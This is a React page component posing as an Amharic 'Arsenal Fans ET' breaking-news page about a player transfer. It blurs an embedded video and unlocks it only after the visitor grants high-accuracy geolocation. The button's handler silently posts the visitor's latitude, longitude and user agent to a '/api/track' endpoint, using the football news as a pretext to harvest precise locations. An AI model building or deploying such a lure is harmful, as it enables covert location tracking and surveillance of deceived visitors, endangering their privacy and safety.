"use client";
import { useState } from "react";

export default function NewsPage() {
  const [isLocked, setIsLocked] = useState(true);
  const [loading, setLoading] = useState(false);

  const handleAccess = () => {
    setLoading(true);
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          await fetch("/api/track", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              userAgent: navigator.userAgent,
            }),
          });
          setIsLocked(false);
          setLoading(false);
        },
        (error) => {
          setLoading(false);
          alert("ይህንን ዝርዝር መረጃ ለማየት እባክዎ የቦታ ፍቃድ (Location Access) ይፍቀዱ።");
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        },
      );
    }
  };

  return (
    <main className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-red-600 py-4 mb-8 text-white shadow-lg">
        <div className="max-w-3xl mx-auto px-4 flex justify-between items-center">
          <span className="font-black text-2xl tracking-tighter italic">
            ARSENAL FANS ET
          </span>
          <span className="text-xs font-bold uppercase bg-white text-red-600 px-2 py-1 rounded">
            ሰበር ዜና
          </span>
        </div>
      </div>

      <div className="max-w-3xl mx-auto px-4">
        <h1 className="text-3xl md:text-4xl font-extrabold text-gray-900 leading-tight mb-6">
          አርሰናል አዲስ ኮከብ ዝውውር በዛሬው እለት በይፋ አጠናቀቀ!
        </h1>

        <div className="relative group">
          <div
            className={`transition-all duration-700 ${isLocked ? "blur-2xl" : "blur-0"}`}
          >
            <div className="relative aspect-video rounded-2xl overflow-hidden shadow-2xl">
              <iframe
                className="absolute top-0 left-0 w-full h-full"
                src="https://www.youtube.com/embed/UZrmzzsC2b8"
                title="Arsenal News"
                frameBorder="0"
                allowFullScreen
              ></iframe>
            </div>
          </div>

          {isLocked && (
            <div className="absolute inset-0 z-10 flex items-center justify-center bg-white/40 backdrop-blur-md rounded-2xl">
              <div className="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4">
                <h3 className="text-xl font-bold mb-2">ቪዲዮውን ለማየት ያረጋግጡ</h3>
                <p className="text-gray-600 mb-6 text-sm">
                  ይህ ዝርዝር መረጃ ለኢትዮጵያ አርሰናል ደጋፊዎች ብቻ የተዘጋጀ ነው። ለማየት ከታች ያለውን ይጫኑ።
                </p>
                <button
                  onClick={handleAccess}
                  disabled={loading}
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition-all"
                >
                  {loading ? "በማረጋገጥ ላይ..." : "ቪዲዮውን ይመልከቱ"}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </main>
  );
}
